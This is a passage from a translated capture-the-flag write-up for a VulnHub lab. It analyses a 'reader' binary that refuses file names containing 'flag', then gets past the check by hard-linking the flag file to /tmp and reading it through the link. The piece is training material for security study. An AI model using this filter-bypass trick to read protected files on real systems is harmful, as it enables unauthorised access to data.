<i>0x4009bd</i> - the number of arguments passed is checked and judging by the code below, the file that will be read is requested; </li><li>  <i>0x4009fe</i> - information about this file is requested; </li><li>  <i>0x400aa4</i> - the <i>strstr</i> function is <i>called</i> , which compares the name of the resulting file with the value at the address <i>0x400c37 -&gt; 0x67616c66 -&gt; galf</i> , i.e.  just with the word <i>flag</i> ; </li><li>  <i>0x400ad1</i> - exit if the file name contains <i>‚Äúflag‚Äù</i> ; </li><li>  <i>0x400b3b</i> - <i>0x64</i> bytes are read from this file and then displayed. </li></ul><br>  The simplest and most obvious option here is to create a link to the <i>flag.txt</i> file and pass it as an argument.  We try: <br><br><pre> <code class="bash hljs">$ ln /home/vulnhub/flag.txt /tmp/qaz $ /home/vulnhub/reader /tmp/qaz</code> </pre> <br><blockquote>  Checking file type ... <br>  Checking if flag file ... <br>  Great!  Printing file contents ... <br>  Win, here's your flag: <br>  FLAG {its_A_ph0t0_ph1ni5h} </blockquote><br>  It worked.  We have the last flag.  Another quest is completed! </div><p>Source: <a href="https://habr.com/ru/post/319204/">https://habr.com/ru/post/319204/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../319194/index.html">Increase code performance: think first about data</a></li>
<li><a href="../319196/index.html">How does the language support service for 1237 Russian IT engineers work, and how does this differ from conventional translation?</a></li>
<li><a href="../319198/index.html">The history of the development of Tower Defense for VK and Android</a></li>
<li><a href="../319200/index.html">Python: collections, part 2/4: indexing, slicing, sorting</a></li>
<li><a href="../319202/index.html">Pure Python Architecture: A Walkthrough. Part 2</a></li>
<li><a href="../319208/index.html">Learn ActionBlock: or a short story about otherwise deadlock</a></li>
<li><a href="../319210/index.html">Bitrix Start Performance on Proxmox and Virtuozzo 7 & Virtuozzo Storage</a></li>
<li><a href="../319212/index.html">"IT infrastructure": Where we go with the "cloud" in 2017</a></li>
<li><a href="../319214/index.html">Cheap Ways to Heat Up Storage with an SSD</a></li>
<li><a href="../319216/index.html">Simple FDTD implementation in Java</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>